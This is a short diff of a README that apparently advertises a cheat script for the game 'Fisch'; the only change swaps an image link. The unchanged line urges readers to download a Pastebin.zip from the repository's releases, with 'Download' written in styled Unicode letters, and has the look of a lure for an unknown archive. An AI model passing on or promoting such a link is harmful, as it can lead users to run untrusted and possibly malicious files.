@@ -2,7 +2,7 @@
 
 # Click to get the script ===>>> ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱 Script](https://github.com/Darkness-Kings/Fisch/releases/download/new/Pastebin.zip)***
 
-![maxresdefault](https://github.com/user-attachments/assets/6850c98e-9574-4e18-a8c6-548d7498c4f3)
+![maxresdefault](https://github.com/user-attachments/assets/6abe7298-f751-4f66-9aac-f17f37cb2d99)
 
 
 
